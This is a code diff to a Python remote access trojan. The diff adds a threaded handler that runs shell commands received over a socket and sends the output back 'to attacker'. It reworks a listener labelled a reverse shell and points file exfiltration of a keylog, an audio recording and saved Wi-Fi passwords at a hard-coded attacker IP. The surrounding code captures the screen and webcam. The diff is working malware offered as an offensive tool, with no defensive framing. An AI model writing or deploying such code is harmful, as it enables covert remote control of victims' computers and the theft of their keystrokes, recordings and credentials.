@@ -131,26 +131,43 @@ def screen_sender(host='0.0.0.0', port=5001):
             threadscreen2.start()
 
 
+def handle_client(client_socket):
+    BUFFER_SIZE = 4096
+    while True:
+        try:
+      
+            command = client_socket.recv(BUFFER_SIZE).decode('utf-8')  
+            if command.lower() == "exit":
+                print("Disconnected from client.")
+                break
+           
+            output = subprocess.getoutput(command)
+            if not output:
+                output = "Command executed but no output."
+            
+            # Gửi kết quả trả về attacker
+            client_socket.send(output.encode('utf-8'))
+        except Exception as e:
+            print(f"Error: {e}")
+            break
+    
+    client_socket.close()
+
 def R_tcp(host='0.0.0.0', port=5000):
-    s = socket.socket()
-    BUFFER_SIZE = 1024
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((host, port))
     s.listen(5)
-    print(f"Revershell started.")
-    client_socket, client_address = s.accept()
-    print(f"{client_address[0]}:{client_address[1]} Connected!")
-    message = "Hacked !".encode()
-    client_socket.send(message)
-    while True:
-        # receive the command from the server
-        command = client_socket.recv(BUFFER_SIZE).decode()
-        if command.lower() == "exit":
-            break
-        output = subprocess.getoutput(command)
-        client_socket.send(output.encode())
-    client_socket.close()
-    s.close()
+    print(f"Reverse shell started and listening on {host}:{port}.")
 
+    while True:
+        client_socket, client_address = s.accept()
+        print(f"{client_address[0]}:{client_address[1]} Connected!")
+        
+        # Gửi thông báo "Hacked!" chỉ một lần sau khi kết nối thành công
+      
+
+        # Xử lý lệnh từ attacker trong một thread riêng
+        threading.Thread(target=handle_client, args=(client_socket,)).start()
 
 def capturevid(conn):
     cap = cv2.VideoCapture(0)
@@ -255,7 +272,7 @@ if __name__ == "__main__":
         threadcam.start()
     
     # Send files to attacker
-    attacker_host = '127.0.0.1'  # Assuming the attacker's IP is the same as the listening IP
+    attacker_host = '192.168.1.5'  # Assuming the attacker's IP is the same as the listening IP
     file_transfer_port = options.port + 3  # Using a new port for file transfer
     
     files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
